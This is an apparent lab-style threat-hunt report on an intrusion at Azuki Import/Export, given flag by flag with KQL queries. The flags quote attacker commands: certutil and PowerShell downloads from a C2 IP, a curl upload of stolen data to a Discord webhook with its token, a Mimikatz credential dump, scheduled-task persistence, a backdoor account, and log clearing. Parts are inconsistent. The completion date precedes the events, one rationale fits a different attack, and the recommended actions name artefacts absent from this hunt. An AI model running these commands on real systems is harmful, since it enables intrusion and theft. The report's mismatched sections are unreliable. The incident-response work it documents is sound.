#  Threat Hunt Report: Azuki Import/Export

Analyst: Andres Torres Richardson

Date Completed: 2025-10-25

Environment Investigated: AZUKI-SL (IT admin workstation)

Timeframe: November, 2025

## Executive Summary

In the month of Novermber 2025 , Azuki Import/Export Trading Co has been targetted by a financially motivated threat actor targeting import/export companies. The adversary established Initial Access, Weaponization with Delivery, Persistence with Evade Detection, and while connecting to a C2 server to achieve their objectives. Each flag represents a key stage of the attack chain, culminating in attempts to cover tracks and exit the environment undetected.

## Timeline

| **Time (UTC)**           | **Flag** | **Action Observed**                          | **Key Evidence**                                        |
| ------------------------ | -------- | -------------------------------------------- | ------------------------------------------------------- |
| **2025-11-18T22:44:11Z** | Flag 1   | Initial Remote Access via RDP                | Inbound Remote IP 88.97.178.12                          |
| **2025-11-18T22:44:11Z** | Flag 2   | Compromised User Account                     | `kenji.sato`                                            |
| **2025-11-19T01:04:05Z** | Flag 3   | Enumerating network topology                 | `ARP.EXE -a` Command Executed                           |
| **2025-11-19T18:49:27Z** | Flag 6   | Folder Excluded for Evasion                  | `C:\Users\KENJI~1.SAT\AppData\Local\Temp`               |
| **2025-11-19T18:49:29Z** | Flag 5   | File Extension Excluding for Evasion         | RegistryValueName's `.bat, .ps1, .exe` Excluded         |
| **2025-11-19T18:49:48Z** | Flag 18  | Malicious Script Method                      | `wupdate.ps1` Downloaded Externally for Execution       |
| **2025-11-19T19:05:33Z** | Flag 4   | Malware Staging Directory Created            | `C:\ProgramData\WindowsCache`                           |
| **2025-11-19T19:07:21Z** | Flag 7   | Download Binary Abuse                        | `certutil.exe` for Fetching Downloads                   |
| **2025-11-19T19:07:22Z** | Flag 12  | Credential Dumping Tool Usage                | `mm.exe`                                                |
| **2025-11-19T19:07:46Z** | Flag 8   | Persistence As Scheduled Task                | schtask.exe /create /tn `Windows Update Check`          |
| **2025-11-19T19:07:46Z** | Flag 9   | Scheduled Task Folder Path Creation          | `C:\ProgramData\WindowsCache\svchost.exe`               |
| **2025-11-19T19:08:26Z** | Flag 13  | Type of Memory Extraction Module             | Mimikatz sekurlsa logonpasswords module                 |
| **2025-11-19T19:08:58Z** | Flag 14  | Data Staging Archive `export-data.zip`       | Compressed Company Data                                 |
| **2025-11-19T19:09:21Z** | Flag 15  | File Upload to Cloud Services                | 443 port connectivity to `discord.com`                  |
| **2025-11-19T19:09:48Z** | Flag 17  | Creation Of Hidden Account                   | Account With Elevated Rights called `support`           |
| **2025-11-19T19:10:37Z** | Flag 19  | Targeted IP for Lateral Movement             | `cmdkey.exe" /list` followed by `cmdkey.exe /generic:10.1.0.188 /user:fileadmin /pass:**********` |
| **2025-11-19T19:10:41Z** | Flag 20  | Tool for Lateral Movement                    | `mstsc.exe /V:` Used for RDP Connectivity to 10.1.0.188 |
| **2025-11-19T19:11:04Z** | Flag 10  | Connection to C2 Server                      | Remote IP `78.141.196.6`                                |
| **2025-11-19T19:11:04Z** | Flag 11  | Port Connectivity to C2 Server               | HTTPS / 443                                             |
| **2025-11-19T19:11:39Z** | Flag 16  | Log clearing via `wevtutil`                  | Cleared Security, System, and App logs by `cl` command  |



---
### Starting Point – Identifying the Initial System

**Objective:**
Determine where initial access was obtained to validate the incident timeline. 


Considering intelligence related to the “JADE SPIDER” threat actor, the typical dwell time ranges from approximately 21 to 45 days, with the most recent observed activity reported in November. <br/>
Based on this, the investigation window was set from 45 days prior through the current date.<br/>
Endpoint Device in question that has been compromised is "azuki-sl".<br/>
I will filter for interactive Logontype which will indicate a public remote IP connection.<br/>

**Host of Interest (Starting Point):** `azuki-sl`  
**Why:** Admin Account has desired data useful for adversary.<br/>
**KQL Query Used:**
```
DeviceLogonEvents
| where AccountDomain contains "azuki-sl"
| where TimeGenerated between (datetime(2025-10-09T00:00:00.0000000Z) .. datetime(2025-11-22T23:00:00.0000000Z))
| where DeviceName contains "azuki-sl"
| where LogonType contains "Interactive"
| where isnotempty(RemoteIP)
| sort by TimeGenerated desc
```

<img width="1151" height="359" alt="1st" src="https://github.com/user-attachments/assets/3169d930-d582-4941-b071-b28bcc6701e7" />
The user account kenji.sato on device azuki-sl shows remote access activity from IP address 159.26.106.98.<br/> 
Let’s query specifically for the earliest instance where this account established a remote session from any external source.<br/> 
After all it's the AccountNames (not necessarily the domain) that are compromised first for the initial entry source.<br/> 

**KQL Query Used:**
```
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-10-09T00:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where AccountName contains "kenji.sato"
| where LogonType contains "Interactive"
| where isnotempty(RemoteIP)
| where RemoteIPType contains "Public"
| sort by TimeGenerated desc

```
<img width="1128" height="495" alt="2nd" src="https://github.com/user-attachments/assets/478978cf-38f4-43dd-b732-af0d1f581318" />

Logs show a TimeGenerated frame between 11/18/2025 and 11/22/2025<br/>
(2025-11-18T22:44:11.6770861Z - 2025-11-22T00:27:58.4166424Z)
This will now be the new timeframe to query moving forward.<br/>

Here I see all the different Devices the user kenji.sato has accessed. "azuki-sl", "azuki-kslog", "azuki-logks", "azuki-wks01", "azuki-logistics"<br/>
First log that shows signs of a suspicious RemoteIP accessing this account via RDP due to its LogonType being "RemoteInteractive" is 88.97.178.12 with Timestamp of 2025-11-18T22:44:11.6770861Z


---

## Flag-by-Flag Findings

---

🚩 **Flag 1 – INITIAL ACCESS - Remote Access Source**  
🎯 **Objective:** Determine initial access from any external connections.  
📌 **Finding (answer):** **88.97.178.12**  
🔍 **Evidence:**
- **Host:** "azuki-logistics"  
- **Timestamp:** 2025-11-18T22:44:11.6770861Z  
- **Process:** Interactive external RDP connection<br/>
💡 **Why it matters:** Origin helps with threat actor attribution and can block ongoing attacks.<br/>

**KQL Query Used:**
```
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-10-09T00:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where AccountName contains "kenji.sato"
| where LogonType contains "Interactive"
| where isnotempty(RemoteIP)
| where RemoteIPType contains "Public"
| sort by TimeGenerated desc

```
<img width="1128" height="495" alt="2nd" src="https://github.com/user-attachments/assets/b39d6820-8a7c-455c-ae73-eb4a4909cdc6" />



---

🚩 **Flag 2 – INITIAL ACCESS - Compromised User Account**  
🎯 **Objective:** Which account credentials were compromised? 
📌 **Finding (answer):** `kenji.sato`  
🔍 **Evidence:**  
- **Host:** "azuki-logistics" 
- **Timestamp:** 2025-11-18T22:44:11.6770861Z<br/>
💡 **Why it matters:** Reveals which account within the Domain has been the victim to brute-force or a phishing attack.<br/>

**KQL Query Used:**
```
DeviceLogonEvents
| where AccountDomain contains "azuki-sl"
| where TimeGenerated between (datetime(2025-10-09T00:00:00.0000000Z) .. datetime(2025-11-22T23:00:00.0000000Z))
| where DeviceName contains "azuki-sl"
| where LogonType contains "Interactive"
| where isnotempty(RemoteIP)
| sort by TimeGenerated desc

```

---

🚩 **Flag 3 – DISCOVERY - Network Reconnaissance**  
🎯 **Objective:** Identify any signs of enumerating network topology.  
📌 **Finding (answer):** `"ARP.EXE" -a`  
🔍 **Evidence:**  
- **Host:** "azuki-logistics"  
- **Timestamp:** 2025-11-19T01:04:05.73442Z 
- **Process:** powershell.exe  
- **CommandLine:** `"ARP.EXE" -a`<br/>
💡 **Why it matters:**  Identifies intention for lateral movement opportunities and high-value targets.<br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where AccountName contains "kenji.sato"
| where InitiatingProcessCommandLine has_any ("powershell", "cmd")
| sort by TimeGenerated desc
| project TimeGenerated, AccountDomain, AccountName, ActionType, ProcessCommandLine

```

<img width="1202" height="613" alt="3rd" src="https://github.com/user-attachments/assets/4581cd3b-45a5-4a4c-ac1c-c1f22fc27a79" />



---

🚩 **Flag 4 – DEFENCE EVASION - Malware Staging Directory**  
🎯 **Objective:**  Identify the primary malware directory. 
📌 **Finding (answer):** `C:\ProgramData\WindowsCache`  
🔍 **Evidence:**  
- **Host:** "azuki-sl"  
- **Timestamp:** 2025-11-19T19:05:33.7665036Z 
- **Process:** `"attrib.exe" +h +s C:\ProgramData\WindowsCache`<br/>
💡 **Why it matters:** It reveal's the scope of compromise and helps locate additional malicious artefacts.<br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where DeviceName has_any ("azuki-sl", "azuki-kslog", "azuki-logks", "azuki-wks01", "azuki-logistics")
| where ActionType == "ProcessCreated"
| where ProcessCommandLine has_any ("+h", "+s")
| project Timestamp, AccountDomain, AccountName, DeviceName, FileName, FolderPath, ProcessCommandLine, ProcessRemoteSessionIP, ProcessRemoteSessionDeviceName
| sort by Timestamp desc

```
<img width="1138" height="659" alt="Flag4" src="https://github.com/user-attachments/assets/41ee5c2b-9836-46bb-bf45-5ce9596885d0" />


---

🚩 **Flag 5 – DEFENCE EVASION - File Extension Exclusions**  
🎯 **Objective:** Look for any possible Window Defender file extension exclusions and count them.  
📌 **Finding (answer):** 3  
🔍 **Evidence:**  
- **Host:** "azuki-sl"  
- **Timestamps:** 2025-11-19T18:49:27.7301011Z - 2025-11-19T18:49:29.1787135Z  
- **Process:** Windows Resistry
- **ActionType:** RegistryValueSet
- **RegistryValueName's:** `.bat,  .ps1, .exe`  <br/>
💡 **Why it matters:** These exclusions reveals the scope of the attacker's defense evasion strategy.<br/>

**KQL Query Used:**
```
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-01T00:30:11.6770861Z) .. datetime(2025-11-22T23:00:00.00Z))
| where DeviceName has_any ("azuki-sl", "azuki-kslog", "azuki-logks", "azuki-wks01", "azuki-logistics")
| where RegistryKey contains "Windows Defender\\Exclusions\\Extensions"
| project TimeGenerated, ActionType, DeviceName, RegistryValueName, InitiatingProcessCommandLine
| order by TimeGenerated desc

```
<img width="997" height="275" alt="Flag5" src="https://github.com/user-attachments/assets/83a80da3-1410-4461-adb9-57106ef0c4ab" />


---

🚩 **Flag 6 – DEFENCE EVASION - Temporary Folder Exclusion**  
🎯 **Objective:** Find folder path exclusions to Windows Defender to prevent scanning of directories.  
📌 **Finding (answer):** `C:\Users\KENJI~1.SAT\AppData\Local\Temp`  
🔍 **Evidence:**  
- **Host:** "azuki-sl"  
- **Timestamp:** 2025-11-19T18:49:27.6830204Z  
- **RegistryKey:** `Windows Defender\\Exclusions\\Paths`  
- **RegistryValueName:** `C:\Users\KENJI~1.SAT\AppData\Local\Temp`  <br/>
💡 **Why it matters:** These exclusions allow malware to run undetected.<br/>

**KQL Query Used:**
```
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-01T00:30:11.6770861Z) .. datetime(2025-11-22T23:00:00.00Z))
| where DeviceName has_any ("azuki-sl", "azuki-kslog", "azuki-logks", "azuki-wks01", "azuki-logistics")
| where RegistryKey contains "Windows Defender\\Exclusions\\Paths"
| project TimeGenerated, ActionType, DeviceName, InitiatingProcessFolderPath, RegistryKey, RegistryValueName, InitiatingProcessCommandLine
| order by TimeGenerated desc

```
<img width="1236" height="541" alt="Flag6" src="https://github.com/user-attachments/assets/ae1d664f-5b24-42ee-a001-31b3c0987f9d" />


---

🚩 **Flag 7 – DEFENCE EVASION - Download Utility Abuse**  
🎯 **Objective:** Identify legitimate system utilities used to download malware.  
📌 **Finding (answer):** `certutil.exe` 
🔍 **Evidence:**  
- **Host:** "azuki-sl"  
- **Timestamps:** 2025-11-19T19:07:21.0804181Z  
- **Process:** "certutil.exe"  
- **CommandLines:**  
  - `"certutil.exe" -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe`  
  - `"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe`  
- **Initiating:** powershell.exe  <br/>
💡 **Why it matters:** comsvcs.dll MiniDump likely targeted LSASS; output masked as HR config to blend with business activity. <br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where DeviceName has_any ("azuki-sl")
| where InitiatingProcessRemoteSessionIP has_any ("192.168.1.45")
| where ActionType == "ProcessCreated"
| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine
| sort by Timestamp desc

```
<img width="1124" height="645" alt="Flag7" src="https://github.com/user-attachments/assets/33210209-377a-40d8-8b09-7964822f2802" />


---

🚩 **Flag 8 – PERSISTENCE - Scheduled Task Name**  
🎯 **Objective:**  Identify the name of the scheduled task created for persistence. 
📌 **Finding (answer):** `Windows Update Check`  
🔍 **Evidence:** 
- **Host:** "azuki-sl"  
- **Timestamp:** 2025-11-19T19:07:46.9796512Z  
- **Process:** schtasks.exe (initiated by powershell.exe)
- **CommandLine:**  
  - `"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f` <br/>
💡 **Why it matters:** Scheduled tasks provide reliable persistence across system reboots.<br/>

**KQL Query Used:**
```
 DeviceProcessEvents
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where DeviceName has_any ("azuki-sl")
| where InitiatingProcessRemoteSessionIP has_any ("192.168.1.45")
| where ProcessCommandLine has_any ("schtasks.exe", "\\create")
| sort by Timestamp desc

```
<img width="1133" height="633" alt="Flag8" src="https://github.com/user-attachments/assets/1beb5e9b-f1a9-443e-a986-0d27b576c3da" />


---

🚩 **Flag 9 – PERSISTENCE - Scheduled Task Target**  
🎯 **Objective:** Identify the executable path configured in the scheduled task.  
📌 **Finding (answer):** `C:\ProgramData\WindowsCache\svchost.exe`
🔍 **Evidence:**  
- **Host:** "azuki-sl"  
- **Timestamp:** 2025-11-19T19:07:46.9796512Z
- **CommandLine:**  
  - `"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f` <br/>
💡 **Why it matters:** This scheduled task path defines what executes at runtime. This reveals the exact persistence mechanism and the malware location.<br/>

**KQL Query Used:**
```
 DeviceProcessEvents
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where DeviceName has_any ("azuki-sl")
| where InitiatingProcessRemoteSessionIP has_any ("192.168.1.45")
| where ProcessCommandLine has_any ("schtasks.exe", "\\create")
| sort by Timestamp desc

```

---

🚩 **Flag 10 – COMMAND & CONTROL - C2 Server Address**  
🎯 **Objective:** Identify the IP address of the command and control server.  
📌 **Finding (answer):** Unusual outbound connection → **78.141.196.6**  
🔍 **Evidence:**  
- **Host:** "azuki-sl" | **ActionType:** "ConnectionSuccess"  
- **Timestamp:** 2025-11-19T19:11:04.1766386Z <br/>
💡 **Why it matters:** Identifying C2 servers enables network blocking and infrastructure tracking. <br/>

**KQL Query Used:**
```
DeviceNetworkEvents
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where InitiatingProcessFolderPath contains "C:\\ProgramData\\WindowsCache\\svchost.exe"

```

<img width="1086" height="637" alt="Flag10" src="https://github.com/user-attachments/assets/3659fb48-af93-40d4-bc06-7d1e4f04e098" />



---

🚩 **Flag 11 – COMMAND & CONTROL - C2 Communication Port**  
🎯 **Objective:** Identify the destination port used for command and control communications.  
📌 **Finding (answer):** Port 443   
🔍 **Evidence:**  
- **Host:** "azuki-sl"  
- **Timestamp:** 2025-11-19T19:11:04.1766386Z
- **RemoteIP:** 78.141.196.6
- **InitiatingProcessRemoteSessionIP:** 192.168.1.45<br/>
💡 **Why it matters:** This information supports network detection rules and threat intelligence correlation..<br/>

**KQL Query Used:**
```
DeviceNetworkEvents
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where InitiatingProcessFolderPath contains "C:\\ProgramData\\WindowsCache\\svchost.exe"
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, LocalIP, Protocol, RemoteIPType, InitiatingProcessParentFileName, InitiatingProcessRemoteSessionDeviceName, InitiatingProcessRemoteSessionIP

```
<img width="1133" height="634" alt="Flag10" src="https://github.com/user-attachments/assets/c09f2478-a116-47ce-8734-7990d5035038" />


---

🚩 **Flag 12 – CREDENTIAL ACCESS - Credential Theft Tool**  
🎯 **Objective:** Identify the filename of the credential dumping tool.  
📌 **Finding (answer):** `mm.exe`  
🔍 **Evidence:**  
- **Host:** "azuki-sl"
- **ActionType:** "FileCreated"
- **InitiatingProcessFileName:** "certitil.exe"
- **InitiatingProcessCommandLine:** `"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe`<br/>
💡 **Why it matters:** Identifies exactly the filename and location to prevent the pivot point of a simple contained compromise to a full environment takeover. <br/>

**KQL Query Used:**
```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z)) 
| where FolderPath startswith "C:\\ProgramData\\WindowsCache"
| sort by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessRemoteSessionIP

```

<img width="1134" height="630" alt="Flag12" src="https://github.com/user-attachments/assets/fa563fc4-0206-4ee1-bd5e-3166090de5d7" />



---

🚩 **Flag 13 – CREDENTIAL ACCESS - Memory Extraction Module**  
🎯 **Objective:**  Identify the module used to extract logon passwords from memory.<br/>
📌 **Finding (answer):** `sekurlsa::logonpasswords` <br/>
🔍 **Evidence:**  
- **Host:** "azuki-sl" 
- **Timestamp:** 2025-11-19T19:08:26.2804285Z
- **FileName:** `mm.exe`
- **ProcessVersionInfoOriginalFileName:** "mimikatz.exe"
- **ProcessCommandLine:** `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`<br/>
💡 **Why it matters:**  Documenting the exact technique used with credential theft tools aids in detection engineering.<br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where DeviceName has_any ("azuki-sl")
| where FileName contains "mm.exe

```
<img width="842" height="431" alt="Flag13" src="https://github.com/user-attachments/assets/7fae08c6-cd0d-466b-bdd1-c4e1a520419c" />

---

🚩 **Flag 14 – COLLECTION - Data Staging Archive**  
🎯 **Objective:** Identify the compressed archive filename used for data exfiltration.  
📌 **Finding (answer):** `export-data.zip`<br/>
🔍 **Evidence:**  <br/>
- **Host:** "azuki-sl"
- **TimeStamp:** 2025-11-19T19:08:58.0244963Z
- **ActionType:** "FileCreated"
- **FolderPath:** `C:\ProgramData\WindowsCache\export-data.zip` <br/>
💡 **Why it matters:** The archive filename often includes dates or descriptive names for the attacker's organisation.<br/>

**KQL Query Used:**
```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z)) 
| where FolderPath startswith "C:\\ProgramData\\WindowsCache"
| sort by Timestamp desc

```
<img width="1115" height="626" alt="Flag14" src="https://github.com/user-attachments/assets/c11d82df-0e97-42e5-844c-d732bbf40de2" />


---

🚩 **Flag 15 – EXFILTRATION - Exfiltration Channel**  
🎯 **Objective:** Identify the cloud service used to exfiltrate stolen data.  
📌 **Finding (answer):** `discord`  
🔍 **Evidence:**  
- **Timestamp:** 2025-11-19T19:09:21.4234133Z
- **Host:** "azuki-sl" · **ActionType:** "ConnectionSuccess" 
- **RemoteUrl:** "discord.com" | **RemotePort:** 443
- **InitiatingProcessCommandLine:** `"curl.exe" -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/1432247266151891004/Exd_b9386RVgXOgYSMFHpmvP22jpRJrMNaBqymQy8fh98gcsD6Yamn6EIf_kpdpq83_8`<br/>
💡 **Why it matters:** Identifying the service helps with incident scope determination and potential data recovery.<br/>

**KQL Query Used:**
```
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19T19:07:22.8551193Z) .. datetime(2025-11-22T23:00:00.00Z))
| where RemotePort in (80, 443)
| where isnotempty(RemoteUrl)
| where InitiatingProcessCommandLine contains "export-data"
| sort by Timestamp desc
| project Timestamp, RemoteUrl, DeviceName, ActionType, RemoteIP, RemotePort, InitiatingProcessCommandLine

```
<img width="1134" height="607" alt="Flag15" src="https://github.com/user-attachments/assets/81029a58-2d3f-4bb0-bd0b-ac70e7bc16b3" />

---


🚩 **Flag 16 – ANTI-FORENSICS - Log Tampering**  
🎯 **Objective:** Identify the first Windows event log cleared by the attacker.  
📌 **Finding (answer):** `Security`  
🔍 **Evidence:**  
- **Host:** "azuki-sl"
- **Timestamp:** 2025-11-19T19:11:39.0934399Z
- **ActionType:** "ProcessCreated" | **FileName:** "wetutil.exe"
- **ProcessCommandLine:** `"wetutil.exe" cl Security`<br/>
💡 **Why it matters:** The order of log clearing can indicate attacker priorities and sophistication.<br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where isnotempty(ProcessCommandLine)
| where ProcessCommandLine contains "wevtutil"
| project Timestamp, ProcessCommandLine
| sort by Timestamp desc 

```
<img width="1135" height="650" alt="Flag16" src="https://github.com/user-attachments/assets/df4c7726-6764-49de-9dc5-377156c0e97e" />


---

🚩 **Flag 17 – IMPACT - Persistence Account**  
🎯 **Objective:** Identify the backdoor account username created by the attacker.  
📌 **Finding (answer):** `support`  
🔍 **Evidence:**  
- **Host:** "azuki-sl"
- **Timestamp:** 2025-11-19T19:09:48.8977132Z
- **ActionType:** "ProcessCreated" | **FileName:** "net.exe"
- **ProcessCommandLine:** `"net.exe" user support ********** /add`<br/>
💡 **Why it matters:** These hidden admin-level accounts provide the adversay alternative access to future operations.<br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where ProcessCommandLine contains "/add"
| where InitiatingProcessFileName == "powershell.exe"
| sort by Timestamp desc 
 

```
<img width="1125" height="618" alt="Flag17" src="https://github.com/user-attachments/assets/71c1e4f5-1fe5-47dd-8436-7b4bf9307f5d" />


---

🚩 **Flag 18 – EXECUTION - Malicious Script**  
🎯 **Objective:** Identify the PowerShell script file used to automate the attack chain.  
📌 **Finding (answer):** `wupdate.ps1`  
🔍 **Evidence:**  
- **Host:** "azuki-sl"
- **Timestamp:** 2025-11-19T18:49:48.7079818Z
- **ActionType:** "FileCreated" | **FileName:** "wupdate.ps1"
- **InitiatingProcessCommandLine:** `powershell  -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://78.141.196.6:8080/wupdate.ps1' -OutFile 'C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1' -UseBasicParsing"`<br/>
💡 **Why it matters:** Identifying the initial attack script reveals the entry point and automation method used in the compromise.<br/>

**KQL Query Used:**
```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where ActionType == "FileCreated"
| where InitiatingProcessFileName == "powershell.exe"
| where InitiatingProcessCommandLine has_any (".bat", ".ps1", ".py", "Invoke-WebRequest")
| where InitiatingProcessRemoteSessionIP == "192.168.1.45"
| sort by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessRemoteSessionDeviceName, InitiatingProcessRemoteSessionIP

```
<img width="1132" height="651" alt="Flag18" src="https://github.com/user-attachments/assets/85cab871-e929-4c25-978c-17241321610a" />



---

🚩 **Flag 19 – LATERAL MOVEMENT - Secondary Target**  
🎯 **Objective:** Identify the IP address targeted for lateral movement.  
📌 **Finding (answer):** 10.1.0.188 
🔍 **Evidence:**  
- **Host:** "azuki-sl"
- **Timestamp:** 2025-11-19T19:10:37.2625077Z
- **ActionType:** "ProcessCreated" | **FileName:** "cmdkey.exe" 
- **ProcessCommandLine's:**
  `"cmdkey.exe" /list`
  `"cmdkey.exe" /generic:10.1.0.188 /user:fileadmin /pass:**********`<br/>
💡 **Why it matters:** Lateral movement targets are selected based on their access to sensitive data or network privileges. Identifying these targets reveals attacker objectives.<br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where ProcessCommandLine has_any ("mstsc", "cmdkey")
| where InitiatingProcessFileName == "powershell.exe"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp desc 

```
<img width="1144" height="640" alt="Flag19" src="https://github.com/user-attachments/assets/ebd26057-e4b1-4fe2-8ce4-cebe717713cf" />


---

🚩 **Flag 20 – LATERAL MOVEMENT - Remote Access Tool**  
🎯 **Objective:** Identify the remote access tool used for lateral movement.  
📌 **Finding (answer):** `mstsc.exe`  
🔍 **Evidence:**  
- **Host:** "azuki-sl"
- **Timestamp:** 2025-11-19T19:10:41.372526Z
- **ActionType:** "ProcessCreated" | **FileName:** "mstsc.exe" 
- **ProcessCommandLine:** `"mstsc.exe" /v:10.1.0.188 `<br/>
💡 **Why it matters:** Windows native remote access tools are preferred for lateral movements making its harder to detect than custom tools.<br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where ProcessCommandLine has_any ("mstsc", "cmdkey")
| where InitiatingProcessFileName == "powershell.exe"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp desc

```
<img width="1132" height="646" alt="Flag20" src="https://github.com/user-attachments/assets/3213f0a4-a5a7-40c2-9d3a-77988527b60d" />



---



## MITRE ATT&CK
- **Initial Access:** – Flags 1, 2<br/>
  -T1078: Flags 1 & 2<br/>
- **Execution:** T1059 (PowerShell) – Flags 7, 18<br/>
  -T1105: Flag 7<br/>
  -T1059: Flag 18<br/>
- **Persistence:** – Flag 8, 9, 17<br/>
  -T1053.005: Flag 8, 9<br/>
  -T1098: Flag 17<br/>
  -T1564.002: Flag 17<br/>
- **Credential Access:** T1003 – Flags 12, 13<br/>
- **Discovery:** T1018 – Flag 3<br/>
- **Lateral Movement:** – Flags 19, 20<br/>
  -T1550.002: Flag 19<br/>
  -T1021.001: Flag 20<br/>
- **Command & Control:** T1071.001 – Flags 10, 11<br/>
- **Exfiltration:** - Flag 14, 15<br/>
  -T1560: Flag 14<br/>
  -T1567: Flag 15<br/>
- **Defense Evasion:** – Flags 4, 5, 6, 16<br/>
  -T1036: Flag 4<br/>
  -T1564.012: Flag 5, 6<br/>
  -T1070.001: Flag 16<br/>

---

## Recommended Actions (Condensed)
1. Reset/rotate credentials (HR/IT/admin).  
2. Re-enable & harden Defender; deploy fresh Sysmon config.  
3. Block/monitor `*.pipedream.net` and related IPs (e.g., **52.54.13.125**).  
4. Integrity review/restore HR data (`PromotionCandidates.csv`, Carlos Tanaka records).  
5. Hunt for persistence across estate; remove `OnboardTracker.ps1` autoruns.  
6. Centralize logs; add detections for `comsvcs.dll, MiniDump` and Defender tamper.
